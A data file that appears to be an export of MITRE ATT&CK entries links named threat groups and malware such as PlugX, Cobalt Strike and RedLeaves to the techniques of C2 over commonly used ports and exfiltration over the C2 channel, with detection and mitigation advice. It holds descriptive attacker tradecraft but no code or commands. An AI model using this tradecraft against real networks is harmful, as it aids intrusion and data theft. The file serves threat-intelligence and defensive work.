746,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['[[Software/S0118|Nidiran]] communicates with its C2 domain over ports 443 and 8443.[[CiteRef::Symantec Suckfly May 2016]]'],['Suckfly'],['Suckfly'],['G0039'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Nidiran, Backdoor.Nidiran",['Command and Control'],['Technique/T1043'],['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
747,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['[[Software/S0154|Cobalt Strike]] uses a custom command and control protocol that communicates over commonly used ports.  The C2 protocol is encapsulated in common application layer protocols.[[CiteRef::cobaltstrike manual]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Cobalt Strike,['Command and Control'],['Technique/T1043'],['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
748,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']","['[[Software/S0083|Misdat]] network traffic communicates over common ports like 80, 443, or 1433.[[CiteRef::Cylance Dust Storm]]']",['Dust Storm'],['Dust Storm'],['G0031'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Misdat,['Command and Control'],['Technique/T1043'],['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
749,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']","['[[Software/S0084|Mis-Type]] communicates over common ports such as TCP 80, 443, and 25.[[CiteRef::Cylance Dust Storm]]']",['Dust Storm'],['Dust Storm'],['G0031'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Mis-Type,['Command and Control'],['Technique/T1043'],['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
750,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']","['[[Software/S0085|S-Type]] uses ports 80, 443, and 8080 for C2.[[CiteRef::Cylance Dust Storm]]']",['Dust Storm'],['Dust Storm'],['G0031'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: S-Type,['Command and Control'],['Technique/T1043'],['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
751,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['[[Software/S0139|PowerDuke]] connects over 443 for C2.[[CiteRef::Volexity PowerDuke November 2016]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: PowerDuke,['Command and Control'],['Technique/T1043'],['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
752,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']","['Some [[Group/G0032|Lazarus Group]] malware uses a list of ordered port numbers to choose a port for C2 traffic, which includes commonly used ports such as 443, 53, 80, 25, and 8080.[[CiteRef::Novetta Blockbuster RATs]]']",['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1043'],['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
753,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['[[Software/S0013|PlugX]] has beaconed to its C2 over port 443.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PlugX, Sogu, Kaba",['Command and Control'],['Technique/T1043'],['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
754,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['[[Software/S0013|PlugX]] has beaconed to its C2 over port 443.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PlugX, Sogu, Kaba",['Command and Control'],['Technique/T1043'],['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
755,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['[[Software/S0152|EvilGrab]] uses port 8080 for C2.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: EvilGrab,['Command and Control'],['Technique/T1043'],['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
756,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['[[Software/S0153|RedLeaves]] uses a specific port of 443 and can also use ports 53 and 80 for C2.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: RedLeaves, BUGJUICE",['Command and Control'],['Technique/T1043'],['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
757,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['[[Software/S0013|PlugX]] has beaconed to its C2 over port 443.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PlugX, Sogu, Kaba",['Command and Control'],['Technique/T1043'],['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
758,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['One [[Software/S0070|HTTPBrowser]] variant connected to its C2 server over port 8080.[[CiteRef::ZScaler Hacking Team]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: HTTPBrowser, Token Control, HttpDump",['Command and Control'],['Technique/T1043'],['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
759,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']","['C2 traffic for most [[Group/G0027|Threat Group-3390]] tools occurs over ports 53, 80, and 443.[[CiteRef::Dell TG-3390]]']",['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1043'],['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
760,"['Detection for command and control applies. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['User interface', 'Process monitoring']",['[[Software/S0147|Pteranodon]] exfiltrates screenshot files to its C2 server.[[CiteRef::Palo Alto Gamaredon Feb 2017]]'],['Gamaredon Group'],['Gamaredon Group'],['G0047'],"['Mitigations for command and control apply. Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Pteranodon,['Exfiltration'],['Technique/T1041'],['Exfiltration Over Command and Control Channel'],https://attack.mitre.org/wiki/Technique/T1041
761,"['Detection for command and control applies. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['User interface', 'Process monitoring']",['A [[Group/G0047|Gamaredon Group]] file stealer transfers collected files to a hardcoded C2 server.[[CiteRef::Palo Alto Gamaredon Feb 2017]]'],['Gamaredon Group'],['Gamaredon Group'],['G0047'],"['Mitigations for command and control apply. Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],['Technique/T1041'],['Exfiltration Over Command and Control Channel'],https://attack.mitre.org/wiki/Technique/T1041
762,"['Detection for command and control applies. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['User interface', 'Process monitoring']",['[[Group/G0004|Ke3chang]] transferred compressed and encrypted RAR files containing exfiltration through the established backdoor command and control channel during operations.[[CiteRef::Villeneuve et al 2014]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Mitigations for command and control apply. Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],['Technique/T1041'],['Exfiltration Over Command and Control Channel'],https://attack.mitre.org/wiki/Technique/T1041
763,"['Detection for command and control applies. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['User interface', 'Process monitoring']",['[[Software/S0045|ADVSTORESHELL]] exfiltrates data over the same channel used for C2.[[CiteRef::ESET Sednit Part 2]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Mitigations for command and control apply. Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: ADVSTORESHELL, NETUI, ...",['Exfiltration'],['Technique/T1041'],['Exfiltration Over Command and Control Channel'],https://attack.mitre.org/wiki/Technique/T1041
764,"['Detection for command and control applies. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['User interface', 'Process monitoring']",['[[Software/S0077|CallMe]] exfiltrates data to its C2 server over the same protocol as C2 communications.[[CiteRef::Scarlet Mimic Jan 2016]]'],['Scarlet Mimic'],['Scarlet Mimic'],['G0029'],"['Mitigations for command and control apply. Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: CallMe,['Exfiltration'],['Technique/T1041'],['Exfiltration Over Command and Control Channel'],https://attack.mitre.org/wiki/Technique/T1041
765,"['Detection for command and control applies. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['User interface', 'Process monitoring']",['[[Software/S0078|Psylo]] exfiltrates data to its C2 server over the same protocol as C2 communications.[[CiteRef::Scarlet Mimic Jan 2016]]'],['Scarlet Mimic'],['Scarlet Mimic'],['G0029'],"['Mitigations for command and control apply. Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Psylo,['Exfiltration'],['Technique/T1041'],['Exfiltration Over Command and Control Channel'],https://attack.mitre.org/wiki/Technique/T1041
766,"['Detection for command and control applies. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['User interface', 'Process monitoring']",['[[Software/S0079|MobileOrder]] exfiltrates data to its C2 server over the same protocol as C2 communications.[[CiteRef::Scarlet Mimic Jan 2016]]'],['Scarlet Mimic'],['Scarlet Mimic'],['G0029'],"['Mitigations for command and control apply. Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: MobileOrder,['Exfiltration'],['Technique/T1041'],['Exfiltration Over Command and Control Channel'],https://attack.mitre.org/wiki/Technique/T1041
767,"['Detection for command and control applies. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['User interface', 'Process monitoring']",['Adversaries can direct [[Software/S0031|BACKSPACE]] to upload files to the C2 Server.[[CiteRef::FireEye APT30]]'],['APT30'],['APT30'],['G0013'],"['Mitigations for command and control apply. Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: BACKSPACE, Lecna",['Exfiltration'],['Technique/T1041'],['Exfiltration Over Command and Control Channel'],https://attack.mitre.org/wiki/Technique/T1041
